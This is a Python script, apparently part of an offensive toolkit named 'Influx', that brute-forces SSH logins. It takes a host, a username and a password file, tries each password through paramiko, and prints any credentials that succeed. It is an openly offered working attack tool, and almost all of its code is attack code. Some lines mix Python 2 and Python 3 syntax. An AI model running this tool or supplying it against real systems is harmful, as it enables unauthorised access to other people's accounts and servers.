from __future__ import print_function
import os
import sys
import socket
import paramiko

#Influx Default Modules Import
Modules_Path = os.path.abspath(os.path.join('..', '..', 'Modules'))
sys.path.append(Modules_Path)
from InfluxPrint import *

#Defining Functions
def show_help():
   print(Status.INFO + "Usage:")
   print("{0} Host Username PasswordFile".format(sys.argv[0]))

def ssh_connect(username, password, stat = 0):
   ssh = paramiko.SSHClient();
   ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

   try:
      ssh.connect(host, port=22, username=username, password=password)
   except paramiko.AuthenticationException:
      stat = 1
   except socket.error, e:
      stat = 2
   ssh.close()
   return stat

#Main Code
global host
try:
   host = sys.argv[1]
   username = sys.argv[2]
   passfile = sys.argv[3]
   if os.path.exists(passfile) == False:
 	  print(Status.ERROR +"Password File Does Not Exist.")
 	  sys.exit(4)
except Exception:
	show_help()
	sys.exit(4)
print(Status.INFO +"SSH BruteForcer")
print(Status.INFO +"Host: " + host)
print(Status.INFO +"Username: " + username)
print(Status.INFO +"Passwords: " + passfile)
print("")
print(Status.JOB +"BruteForce Started")
print("")
print("----------------------------------------------")
print("")
passwords = open(passfile);
for password in passwords:
   password = password.strip("\n");
   try:
      res = ssh_connect(username, password)
      if res == 1:
         print (Color.RED + "[+]Auth Faild" + Color.ENDC, end=" ")
         print(": User:{0} Pass:{1}".format(username, password))

      if res == 2:
         print(Status.ERROR +"Error:Host Down")
         sys.exit(2)

      if res == 0:
         print (Color.GREEN + "[+]Auth Succeed" + Color.ENDC, end=" ") 
         print(":Password Found: User:{0} Pass:{1}".format(username, password))
   except Exception, e:
      print(Status.ERROR +"Error:" + e)
      pass
   except KeyboardInterrupt:
   	  print("")
   	  print(Status.INFO +"User Interrupted The Proccess")
   	  print(Status.INFO +"Job Finished!")
   	  print(Status.INFO +"Coded By The Nonexistent")
   	  sys.exit()

passwords.close()
print("")
print("----------------------------------------------")
print("")
print(Status.INFO +"Job Finished!")
print(Status.INFO +"Coded By The Nonexistent")
sys.exit(0)
